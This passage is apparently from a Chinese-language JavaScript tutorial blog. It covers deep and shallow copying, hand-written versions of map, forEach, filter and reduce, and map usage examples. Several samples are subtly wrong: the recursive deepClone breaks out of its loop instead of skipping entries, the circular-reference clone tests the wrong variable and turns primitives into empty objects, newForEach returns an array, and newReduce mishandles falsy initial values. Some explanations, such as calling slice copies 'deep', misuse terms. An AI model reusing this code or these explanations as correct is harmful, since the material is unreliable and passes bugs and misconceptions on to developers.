<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]；</span><br><span class="line"><span class="keyword">var</span> arr2 = arr1;</span><br><span class="line">arr1.push(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr1, arr2); <span class="comment">// [1, 2, 3, 4]、[1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>深拷贝：将数据的基本数据类型和引用类型都拷贝一份，在内存中存在两个数据结构完全相同但是又互相独立的数据。<br><strong>深拷贝的实现方式</strong>：</p>
<ul>
<li><p>简单引用类型（数组）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// slice、concat、push、unshift、map、forEach、Array.from、Array.of、...运算符、数组解构等</span></span><br><span class="line"><span class="comment">// 都只能实现简单引用类型的拷贝</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// case1: slice</span></span><br><span class="line"><span class="comment">// 深拷贝</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = arr1.slice();</span><br><span class="line"><span class="comment">// var arr2 = arr1.concat([])</span></span><br><span class="line">arr1.push(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr1, arr2); <span class="comment">// [1, 2, 3, 4]、[1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 浅拷贝</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [&#123;<span class="attr">a</span>: <span class="number">1</span>&#125;, &#123;<span class="attr">a</span>: <span class="number">11</span>&#125;];</span><br><span class="line"><span class="keyword">var</span> arr2 = arr1.slice();</span><br><span class="line"><span class="comment">// var arr2 = arr1.concat([])</span></span><br><span class="line">arr1[<span class="number">0</span>].a = <span class="number">111</span>;</span><br><span class="line"><span class="built_in">console</span>.log(arr1, arr2); <span class="comment">// [&#123;a: 111&#125;, &#123;a: 11&#125;]、[&#123;a: 111&#125;, &#123;a: 11&#125;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// case2: Array.form</span></span><br><span class="line"><span class="comment">// 深拷贝</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>(arr1));</span><br><span class="line"><span class="comment">// var arr2 = Array.of(...arr1);</span></span><br><span class="line">arr1.push(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr1, arr2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浅拷贝</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [&#123;<span class="attr">a</span>: <span class="number">1</span>&#125;, &#123;<span class="attr">a</span>: <span class="number">11</span>&#125;];</span><br><span class="line"><span class="keyword">var</span> arr2 = <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>(arr1));</span><br><span class="line"><span class="comment">// var arr2 = Array.of(...arr1);</span></span><br><span class="line">arr1[<span class="number">0</span>].a = <span class="number">111</span>;</span><br><span class="line"><span class="built_in">console</span>.log(arr1, arr2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// case3: ...运算符</span></span><br><span class="line"><span class="comment">// 深拷贝</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = [...arr1];</span><br><span class="line"><span class="comment">// var arr2 = new Array(...arr1);</span></span><br><span class="line"><span class="comment">// var [...arr2] = arr1;</span></span><br><span class="line">arr1.push(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr1, arr2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浅拷贝</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [&#123;<span class="attr">a</span>: <span class="number">1</span>&#125;, &#123;<span class="attr">a</span>: <span class="number">11</span>&#125;];</span><br><span class="line"><span class="keyword">var</span> arr2 = [...arr1];</span><br><span class="line"><span class="comment">// var arr2 = new Array(...arr1);</span></span><br><span class="line"><span class="comment">// var [...arr2] = arr1;</span></span><br><span class="line">arr1[<span class="number">0</span>].a = <span class="number">111</span>;</span><br><span class="line"><span class="built_in">console</span>.log(arr1, arr2);</span><br></pre></td></tr></table></figure>
</li>
<li><p>简单引用类型（对象）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 深拷贝</span></span><br><span class="line"><span class="comment">// Object.assign 只能实现简单引用类型的深拷贝</span></span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;</span><br><span class="line"><span class="keyword">var</span> obj2 = <span class="built_in">Object</span>.assign(&#123;&#125;, obj1)</span><br><span class="line">obj1.c = <span class="number">3</span></span><br><span class="line"><span class="built_in">console</span>.log(obj1, obj2) <span class="comment">// &#123;a: 1, b: 2, c: 3&#125;、&#123;a: 1, b: 2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 浅拷贝</span></span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;<span class="attr">a</span>: &#123;<span class="attr">age</span>: <span class="number">20</span>&#125;&#125;</span><br><span class="line"><span class="keyword">var</span> obj2 = <span class="built_in">Object</span>.assign(&#123;&#125;, obj1)</span><br><span class="line">obj1.a.age = <span class="number">30</span></span><br><span class="line"><span class="built_in">console</span>.log(obj1, obj2) <span class="comment">// &#123;a: &#123;age: 30&#125;&#125;、&#123;a: &#123;age: 30&#125;&#125;</span></span><br><span class="line"><span class="comment">// 注意，如果是新增属性则不会影响源数据</span></span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;<span class="attr">a</span>: &#123;<span class="attr">age</span>: <span class="number">20</span>&#125;, <span class="attr">b</span>: &#123;<span class="attr">age</span>: <span class="number">25</span>&#125;&#125;</span><br><span class="line"><span class="keyword">var</span> obj2 = <span class="built_in">Object</span>.assign(&#123;&#125;, obj1)</span><br><span class="line">obj1.c = &#123;<span class="attr">age</span>: <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">console</span>.log(obj1, obj2) <span class="comment">// &#123;a: &#123;age: 20&#125;, b: &#123;age: 25&#125;, c: &#123;age: 30&#125;&#125;、&#123;a: &#123;age: 20&#125;, b: &#123;age: 25&#125;&#125;</span></span><br><span class="line"><span class="comment">// 结论：</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>以上的方法都是当数组内部为基本类型时为深拷贝，为引用类型是为浅拷贝</strong></p>
</li>
<li><p><code>JSON.parse(JSON.stringify())</code>; 但无法复制内部的函数</p>
</li>
<li><p>热门库 <code>lodash</code> 提供了一个 <code>_.cloneDeep</code> 的方法;</p>
</li>
<li><p><code>jQuery</code> 提供了一个 <code>$.extend(true, {}, {})</code>， 默认是浅拷贝（第一个参数不传），第一个传输传true为深拷贝;</p>
</li>
<li><p>手写递归方法</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现深度克隆--只考虑对象/数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepClone</span>(<span class="params">target</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="built_in">Array</span>.isArray(target) ? [] : &#123;&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 数组和对象的typeof 都是object（此处巧妙使用了typeof，也可以使用Object.prototype.toString.call(target).slice(8, -1)来取到类型Object或Array）</span></span><br><span class="line">  <span class="keyword">if</span> (target &amp;&amp; <span class="keyword">typeof</span> target === <span class="string">'object'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历目标数据(for...in可以遍历对象和数组，后例会介绍其用法)</span></span><br><span class="line">    <span class="comment">// target为数组时，i表示索引；为对象时，i表示key</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> target) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 只处理自有属性</span></span><br><span class="line">      <span class="keyword">if</span> (!target.hasOwnProperty(i)) <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 判断目标结构中的每一项是否存在对象/数组，决定是否需要递归下去</span></span><br><span class="line">      <span class="keyword">if</span> (target[i] &amp;&amp; <span class="keyword">typeof</span> target[i] === <span class="string">'object'</span>) &#123;</span><br><span class="line">        result[i] = deepClone(target[i]); <span class="comment">// 子属性仍是对象或数组，则递归执行</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result[i] = target[i]; <span class="comment">// 不需要递归，value已经能是基本的数据类型</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试：</span></span><br><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">  a: <span class="number">1</span>,</span><br><span class="line">  b: &#123;<span class="attr">c</span>: <span class="number">2</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> B = deepClone(A);</span><br><span class="line"></span><br><span class="line">A.b.c = <span class="number">22</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(A); <span class="comment">// &#123;a: 1, b: &#123;c: 22&#125;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(B); <span class="comment">// &#123;a: 1, b: &#123;c: 2&#125;&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>手写递归方法（考虑含有循环引用）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepClone</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> vistedMap = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">baseClone</span>(<span class="params">target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(target !== <span class="literal">null</span> &amp;&amp; <span class="keyword">typeof</span> obj === <span class="string">'object'</span>)) <span class="keyword">return</span> target</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(vistedMap.get(target)) <span class="keyword">return</span> vistedMap.get(target)</span><br><span class="line">    <span class="keyword">let</span> result = <span class="built_in">Array</span>.isArray(target) ? [] : &#123;&#125;</span><br><span class="line">    vistedMap.set(target, result)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> keys = <span class="built_in">Object</span>.keys(target);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>, len = keys.length; i &lt; len; i++) &#123;</span><br><span class="line">      result[keys[i]] = baseClone(target[keys[i]])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> baseClone(obj)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<hr>
<h2 id="js实现map、forEach、filter、reduce高阶函数"><a href="#js实现map、forEach、filter、reduce高阶函数" class="headerlink" title="js实现map、forEach、filter、reduce高阶函数"></a>js实现map、forEach、filter、reduce高阶函数</h2><h3 id="js实现map方法"><a href="#js实现map方法" class="headerlink" title="js实现map方法"></a>js实现map方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">arr.map(<span class="function"><span class="keyword">function</span>(<span class="params">item, index, self</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item, index, self);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'xxx'</span></span><br><span class="line">&#125;, thisArg); <span class="comment">// 参数2可选，表示执行 callback 函数时使用的this 值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数是一个回调函数，返回值是一个Array，不需要关心内部处理</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.newMap = <span class="function"><span class="keyword">function</span>(<span class="params">fn, context</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// this指向的就是调用者arr</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">"function"</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">`<span class="subst">$&#123;fn&#125;</span> is not a function`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  context = <span class="built_in">Object</span>(context) || global; <span class="comment">// 严格模式下，context 为 null 或 undefined 时 Object(context) 返回空对象，不会被赋值为global</span></span><br><span class="line">  <span class="keyword">var</span> newArr = [];</span><br><span class="line">　<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.length; i++) &#123;</span><br><span class="line">　　newArr.push(fn.call(context, <span class="keyword">this</span>[i], i, <span class="keyword">this</span>));</span><br><span class="line">　&#125;</span><br><span class="line">  <span class="keyword">return</span> newArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="js实现forEach方法"><a href="#js实现forEach方法" class="headerlink" title="js实现forEach方法"></a>js实现forEach方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item, index, self</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item, index, self);</span><br><span class="line">&#125;, thisArg); <span class="comment">// 参数2可选，表示执行 callback 函数时使用的this 值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数是一个回调函数，返回值是一个Array，不需要关心内部处理</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.newForEach = <span class="function"><span class="keyword">function</span>(<span class="params">fn, context</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// this指向的就是调用者arr</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">"function"</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">`<span class="subst">$&#123;fn&#125;</span> is not a function`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  context = <span class="built_in">Object</span>(context) || global; <span class="comment">// 严格模式下，context 为 null 或 undefined 时 Object(context) 返回空对象，不会被赋值为global</span></span><br><span class="line">  <span class="keyword">var</span> newArr = [];</span><br><span class="line">　<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.length; i++) &#123;</span><br><span class="line">　　newArr.push(fn.call(context, <span class="keyword">this</span>[i], i, <span class="keyword">this</span>));</span><br><span class="line">　&#125;</span><br><span class="line">  <span class="keyword">return</span> newArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="js实现filter方法-基本同map"><a href="#js实现filter方法-基本同map" class="headerlink" title="js实现filter方法(基本同map)"></a>js实现filter方法(基本同map)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">arr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">item, index, self</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item, index, self);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;, thisArg);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.prototype.newFilter = <span class="function"><span class="keyword">function</span> (<span class="params">fn, context</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// this指向的就是调用者arr</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">'function'</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">`<span class="subst">$&#123;fn&#125;</span> is not a function`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  context = <span class="built_in">Object</span>(context) || global; <span class="comment">// 严格模式下，context 为 null 或 undefined 时 Object(context) 返回空对象，不会被赋值为global</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> leftArr = []</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fn.call(context, <span class="keyword">this</span>[i], i, <span class="keyword">this</span>)) &#123;</span><br><span class="line">      leftArr.push(<span class="keyword">this</span>[i])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> leftArr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="js实现reduce方法"><a href="#js实现reduce方法" class="headerlink" title="js实现reduce方法"></a>js实现reduce方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">arr.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">prev, cur, index, arr</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(prev, cur, index, arr);</span><br><span class="line">&#125;[, initialValue]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.prototype.newReduce = <span class="function"><span class="keyword">function</span> (<span class="params">fn, initialValue</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// this指向的就是调用者arr</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">"function"</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">`<span class="subst">$&#123;fn&#125;</span> is not a function`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> account = initialValue || <span class="keyword">this</span>[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">const</span> startIndex = initialValue ? <span class="number">0</span> : <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = startIndex; i &lt; <span class="keyword">this</span>.length; i++) &#123;</span><br><span class="line">    account = fn(account, <span class="keyword">this</span>[i], i, <span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> account;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="forEach-和-map的区别"><a href="#forEach-和-map的区别" class="headerlink" title="forEach 和 map的区别"></a>forEach 和 map的区别</h2><p>相同点：</p>
<ul>
<li>都是循环遍历数组中的每一项</li>
<li>每次执行匿名函数都支持三个参数，参数分别为item（当前每一项），index（索引值），arr（原数组）</li>
<li>匿名函数中的 <code>this</code> 都是指向 <code>window</code></li>
<li>只能遍历数组</li>
<li>都没有break跳出循环，当想跳出循环可以使用every 和 some方法，参照下例 </li>
</ul>
<p>不同点</p>
<ul>
<li>map方法返回一个新的数组，数组中的元素为原始数组调用函数处理后的值，map方法不会改变原始数组</li>
<li>map方法不会对空数组进行检测</li>
<li>foreach方法没有返回一个新数组&amp;没有返回值，即处理的是数组本身</li>
<li>foreach方法会对空数组进行检测</li>
</ul>
<hr>
<h2 id="map、forEach、every、some、-each、for…in、es6-for…of等用法"><a href="#map、forEach、every、some、-each、for…in、es6-for…of等用法" class="headerlink" title="map、forEach、every、some、$.each、for…in、es6 for…of等用法"></a>map、forEach、every、some、$.each、for…in、es6 for…of等用法</h2><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    num: <span class="number">10</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">2</span>,</span><br><span class="line">    num: <span class="number">20</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">3</span>,</span><br><span class="line">    num: <span class="number">30</span>,</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"><span class="comment">// map()方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值。</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 注意事项：</span></span><br><span class="line"><span class="comment">// 1、map方法内容应该有一个return语句</span></span><br><span class="line"><span class="comment">// 2、原数组不会被修改</span></span><br><span class="line"><span class="comment">// 3、不会进行空数组检测</span></span><br><span class="line"><span class="comment">// 4、那些已删除或者未初始化的项将被跳过（例如在稀疏数组上，稀疏数组如 new Array(10)）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景1：收集所有的id</span></span><br><span class="line"><span class="keyword">const</span> arr1 = arr.map(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// return item.id; // 收集value值 [1, 2, 3]</span></span><br><span class="line">  <span class="keyword">return</span> &#123;<span class="attr">id</span>: item.id&#125;; <span class="comment">// 收集键值对 [&#123;id: 1&#125;, &#123;id: 2&#125;, &#123;id: 3&#125;]</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景2：将arr每一项中的num乘以2</span></span><br><span class="line"><span class="keyword">const</span> arr2 = arr.map(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> item.num * <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr2); <span class="comment">// [20, 40, 60]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景3：往arr每一项中新增一个name字段，并赋初始值 小明</span></span><br><span class="line"><span class="keyword">const</span> arr3 = arr.map(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> $.extend(item, &#123;</span><br><span class="line">    name: <span class="string">'小明'</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr3); <span class="comment">// [&#123;id:1, num:10, name:'小明'&#125;, ...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景4，一步操作，同时满足2和3</span></span><br><span class="line"><span class="keyword">const</span> arr4 = arr.map(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> $.extend(item, &#123;</span><br><span class="line">    num: item.num * <span class="number">2</span>,</span><br><span class="line">    name: <span class="string">'小明'</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr4); <span class="comment">// [&#123;id:1, num:20, name:'小明'&#125;, ...]</span></span><br></pre></td></tr></table></figure>
